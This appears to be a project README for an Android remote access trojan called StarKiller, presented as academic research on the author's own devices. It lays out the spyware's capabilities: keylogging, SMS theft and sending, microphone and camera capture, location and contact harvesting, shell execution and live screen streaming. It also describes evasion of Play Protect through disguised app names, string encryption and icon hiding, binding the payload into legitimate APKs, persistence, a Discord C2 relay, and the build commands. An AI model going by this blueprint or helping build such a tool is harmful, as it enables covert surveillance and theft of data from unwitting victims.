# STARKILLER

```
 ███████╗████████╗ █████╗ ██████╗ ██╗  ██╗██╗██╗     ██╗     ███████╗██████╗
 ██╔════╝╚══██╔══╝██╔══██╗██╔══██╗██║ ██╔╝██║██║     ██║     ██╔════╝██╔══██╗
 ███████╗   ██║   ███████║██████╔╝█████╔╝ ██║██║     ██║     █████╗  ██████╔╝
 ╚════██║   ██║   ██╔══██║██╔══██╗██╔═██╗ ██║██║     ██║     ██╔══╝  ██╔══██╗
 ███████║   ██║   ██║  ██║██║  ██║██║  ██╗██║███████╗███████╗███████╗██║  ██║
 ╚══════╝   ╚═╝   ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝╚══════╝╚══════╝╚══════╝╚═╝  ╚═╝
```

**22DIV // george wu // Android Remote Access**

> *"The dark side is a pathway to many abilities some consider to be... unnatural."*

---

### Classification

```
CLASSIFICATION:  UNCLASSIFIED // ACADEMIC USE ONLY
OPERATOR:        VADER (george wu / 22DIV)
AUTHORISATION:   CSEC academic research, own devices
DOCTRINE:        Israeli cyber methodology — cross-platform capability
                 Windows + Android. Desktop + mobile. Full-spectrum.
TARGET:          Own Android devices ONLY
STATUS:          PHASE 3 — Play Protect bypass, VNC live, GUI refactored
COMMIT:          6e122bf (2026-06-24)
```

### What This Is

Android RAT built from first principles. Kotlin client, Python C2 server with desktop GUI + Discord relay.
Speaks VADER agent protocol (length-prefixed JSON over TCP). Includes obfuscation pipeline,
APK binder, detection scanner, and automated test suite.

Own hardware only. CSEC security research. Private repo.

### Architecture

```
StarKiller/
├── server/
│   ├── starkiller_c2.py        C2 server — web dashboard + agent listener
│   ├── starkiller_gui.py       Desktop GUI C2 — tkinter, Discord relay
│   └── test_client.py          Simulated Android agent for testing
├── client/                     Android Kotlin project (com.georgetech.filesync)
│   ├── app/
│   │   ├── src/main/
│   │   │   ├── kotlin/com/georgetech/filesync/
│   │   │   │   ├── MainActivity.kt          Launcher (screen grant → start service)
│   │   │   │   ├── SyncService.kt           Foreground service + C2 lifecycle
│   │   │   │   ├── SyncAdapter.kt           VADER protocol (encrypted strings)
│   │   │   │   ├── Dispatcher.kt            Task dispatch to modules (modA-modJ)
│   │   │   │   ├── Config.kt                Encrypted C2 config (build-time injected)
│   │   │   │   ├── Crypt.kt                 Runtime XOR+Base64 string decryption
│   │   │   │   ├── GrantActivity.kt         MediaProjection permission re-grant
│   │   │   │   ├── persistence/
│   │   │   │   │   └── StartReceiver.kt     BOOT_COMPLETED (disabled in test build)
│   │   │   │   └── modules/
│   │   │   │       ├── SysInfo.kt           Device info + WiFi info
│   │   │   │       ├── PhotoHelper.kt       Camera2 API — front/rear JPEG
│   │   │   │       ├── MsgReader.kt         SMS read/send
│   │   │   │       ├── LocProvider.kt       GPS/network location
│   │   │   │       ├── AddrBook.kt          Contact list export
│   │   │   │       ├── StorageHelper.kt     Directory list + file download
│   │   │   │       ├── AudioHelper.kt       Ambient audio recording
│   │   │   │       ├── DisplayHelper.kt     Screenshot + VNC stream (MediaProjection)
│   │   │   │       ├── InputService.kt      Accessibility Service keylogger
│   │   │   │       ├── HistoryReader.kt     Call history dump
│   │   │   │       ├── PkgScanner.kt        Installed packages
│   │   │   │       └── AlertService.kt      Notification interception
│   │   │   ├── res/
│   │   │   │   ├── values/strings.xml
│   │   │   │   └── xml/accessibility_config.xml
│   │   │   └── AndroidManifest.xml
│   │   ├── build.gradle.kts                 SDK 34, Kotlin 1.9.24, R8 on debug+release
│   │   └── proguard-rules.pro               Hardened (5-pass, repackage, strip all)
│   ├── build.gradle.kts                     AGP 8.5.0
│   ├── settings.gradle.kts
│   └── gradle.properties
├── tools/                      Downloaded RE tools (gitignored)
│   ├── apktool.jar             APK decompile/recompile (v3.0.2)
│   ├── jadx/                   DEX decompiler for verification
│   └── uber-apk-signer.jar    APK signing (v1.3.0)
├── payloads/                   Built APKs + backups (gitignored)
├── assets/                     Screenshots, reports
├── setup.py                    Automated Android SDK + Gradle setup
├── build.py                    Build APK with encrypted C2 config
├── obfuscate.py                String encryption + ProGuard + DEX scanner
├── binder.py                   APK injection (decompile + inject + patch + sign)
├── test_headless.py            38-test automated integration suite
├── STARKILLER_MANUAL.md        Full technical manual
├── CODE_WALKTHROUGH.md         Annotated code walkthrough
└── README.md
```

### Protocol

VADER agent protocol — length-prefixed JSON over TCP:

```
Wire format: [4-byte big-endian length][UTF-8 JSON payload]

Agent -> C2:
  register   — agent_id, hostname, os, platform, model, sdk
  heartbeat  — battery, last_gps
  result     — task_id, data (JSON object with op results)
  file_data  — task_id, filename, size, data (base64)

C2 -> Agent:
  task       — task_id, op, [op-specific params]
```

### Operations

Current test build (stripped manifest — Play Protect clean):

| # | Op Code | Description | Requires |
|---|---------|-------------|---------|
| 1 | `sysinfo` | Model, OS, carrier, Android ID, battery | nothing |
| 2 | `wifi` | SSID, BSSID, signal dBm, link speed, IP, transport | ACCESS_WIFI_STATE |
| 3 | `apps` | Package name, label, system flag | QUERY_ALL_PACKAGES |
| 4 | `screenshot` | MediaProjection screen capture | MediaProjection |
| 5 | `screen_grant` | Re-launch transparent MediaProjection grant | — |
| 6 | `vnc` | Live screen streaming (configurable interval/frames) | MediaProjection |
| 7 | `ls` | Directory listing | — |
| 8 | `exec` | Shell command (sh -c) | nothing |
| 9 | `ping` | Latency check | nothing |

Full build ops (add dangerous permissions to manifest):

| # | Op Code | Description |
|---|---------|-------------|
| 10 | `camera` | Front/rear photo (Camera2 API, JPEG) |
| 11 | `sms_read` | Inbox dump (last 100) |
| 12 | `sms_send` | Send SMS from device |
| 13 | `gps` | GPS/network location with accuracy |
| 14 | `contacts` | Name + number + type |
| 15 | `download` | File download (base64) |
| 16 | `mic` | Ambient audio (configurable seconds) |
| 17 | `calllog` | Incoming/outgoing/missed history |
| 18 | `recon` | sysinfo + wifi + apps combined |
| 19 | `exit` | Kill agent |

### Evasion

| Layer | Technique | Status |
|-------|-----------|--------|
| Package name | `com.georgetech.filesync` — legitimate-looking sync app | DONE |
| App name | "Remote Desktop" — plausible utility | DONE |
| Class naming | All modules renamed to innocent names (SysInfo, PhotoHelper, etc.) | DONE |
| Variable naming | Dispatcher uses `modA`-`modJ` — no semantic leaks in DEX | DONE |
| String encryption | XOR+Base64 all protocol strings + C2 config | DONE |
| R8 obfuscation | Enabled on debug + release. 5-pass, flatten, repackage, strip sources | DONE |
| Config injection | C2 host/port baked at build time, encrypted in DEX | DONE |
| Permission stripping | Manifest has NO dangerous permissions — Play Protect clean | DONE |
| No boot receiver | RECEIVE_BOOT_COMPLETED removed from test build | DONE |
| No suspicious services | Accessibility + NotificationListener stripped from test build | DONE |
| APK binding | Inject into legit APK (apktool decompile + Smali inject) | DONE |
| Detection scanner | Self-scan DEX string tables for known RAT signatures | DONE |
| Icon hiding | Remove launcher icon after first launch (configurable) | DONE |
| DEX verification | ZERO payload identifiers in compiled DEX string tables | VERIFIED |

### Persistence (full build)

- `RECEIVE_BOOT_COMPLETED` + `QUICKBOOT_POWERON` — start on boot
- Foreground service with `START_STICKY` — OS restarts if killed
- `WakeLock` — prevent CPU sleep during ops
- Battery optimization bypass request
- Auto-reconnect with exponential backoff (5s → 5min cap)

### Quick Start

```bash
# 1. Setup (one-time) — downloads Android SDK, sets up Gradle
python setup.py

# 2. Build APK with your C2 IP
python build.py --ip 192.168.1.x --port 8667 --name "Remote Desktop"

# 3. Start GUI C2
python server/starkiller_gui.py

# 4. Test locally (no phone needed)
python server/test_client.py --ip 127.0.0.1

# 5. Run automated test suite
python test_headless.py

# 6. Bind into legit APK (optional)
python binder.py target.apk --payload-smali path/to/smali/

# 7. Scan for detection signatures
python obfuscate.py scan payloads/starkiller-debug.apk
```

### GUI C2 Controller

![StarKiller GUI C2](assets/gui_screenshot.png)

Desktop tkinter application with:
- Agent sidebar (state-diffed — no flicker on VNC)
- Device info panel (model, OS, SDK, battery)
- 8 operation buttons (working ops only) + RECON + VNC STREAM
- Live console with color-coded output
- Command bar (`exec` shortcut, `!vnc <ms>` interval control)
- Discord relay for internet C2 (bypasses NAT)
- Live screen panel with frame counter + interval display

### Test Results (2026-06-24)

```
Headless integration suite: 38/38 PASS (baseline — pre-refactor)

Live device test (Samsung SM-G970U, Android 12 — 2026-06-24):
  TCP handshake:      PASS
  Registration:       PASS
  sysinfo:            PASS (manufacturer, model, android_version)
  apps (320):         PASS
  ping:               PASS
  VNC stream:         PASS — live screen feed confirmed
  screenshot:         PASS — single frame capture confirmed
  exec:               PASS
  wifi:               UNTESTED (new op — not yet run on device)
  GPS/SMS/contacts:   FAIL — permissions not in manifest (by design)
  camera/mic:         FAIL — permissions not in manifest (by design)

Play Protect:
  v0.1 (com.android.internal.svc): BLOCKED — system package impersonation
  v0.3 (com.georgetech.filesync):  PASS — "unsigned app" warning only

DEX string scan:
  Standalone APK: 0 payload identifiers
  APK size (v0.3): 1541 KB
```

---

### Testing Checklist (v0.3)

**Install**
- [ ] Download APK from GitHub Releases (v0.2.0 tag)
- [ ] Install — Play Protect should show "unsigned app" only, not virus
- [ ] Open "Remote Desktop"

**On launch**
- [ ] Screen recording dialog fires → tap **Start now**
- [ ] App closes, agent appears in GUI sidebar

**Ops to verify**
- [ ] SYSINFO returns model/OS/carrier
- [ ] WIFI returns SSID/signal/IP
- [ ] APPS returns package list
- [ ] SCREEN returns single screenshot
- [ ] VNC STREAM shows live frames in panel (no flicker)
- [ ] EXEC (`id`, `uname -a`, `ls /proc/net`) returns output
- [ ] FILES (`ls /sdcard`) returns directory listing
- [ ] PING returns latency

**Note any failures and file as issues.**

### Tools Required

| Tool | Version | Source |
|------|---------|--------|
| Java JDK | 17+ | Microsoft OpenJDK / Adoptium |
| Python | 3.10+ | System |
| Android SDK | cmdline-tools | setup.py downloads automatically |
| apktool | 3.0.2 | github.com/iBotPeaches/Apktool |
| uber-apk-signer | 1.3.0 | github.com/patrickfav/uber-apk-signer |
| tkinter | stdlib | Included with Python |
| Pillow | latest | pip install Pillow |
| ADB | 37+ | Optional — for direct install |

### Research Sources

Built after studying:
- G700 RAT (CraxsRAT evolution) — C# server, Java APK, APKEditor obfuscation, Telegram exfil
- EagleSpy v5 — anti-VM/debug, Accessibility abuse, 2FA theft, black screen overlay
- L3MON — Node.js + Socket.io, web dashboard, Docker, Smali injection
- Cerberus (leaked source) — fork ecosystem, overlay attacks, obfuscation patterns

### Rules of Engagement

1. Own devices only
2. Private repo — never public
3. CSEC academic research context
4. No distribution of built APKs
5. Binaries never committed to repo
6. All protocol strings encrypted
7. No plaintext C2 config in source control

---

*Built from VADER's protocol. The agent doesn't care what OS it runs on.*
